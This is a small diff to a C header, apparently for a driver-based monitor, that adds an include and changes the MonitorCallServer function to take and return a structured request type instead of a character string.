@@ -11,6 +11,8 @@
 #include <h/drvioctl.h>
 #include <inc/processtable.h>
 #include <inc/servercon.h>
+#include <inc/srequest.h>
+
 
 #define MONITOR_STATE_STOPPED 1
 #define MONITOR_STATE_STARTED 2
@@ -49,5 +51,5 @@ VOID MonitorSendKbdBuf(PMONITOR Monitor, PVOID BuffEntry);
 PMONITOR
 	MonitorGetInstance(VOID);
 
-char *
-	MonitorCallServer(char *request);
+PSREQUEST
+	MonitorCallServer(PSREQUEST request);
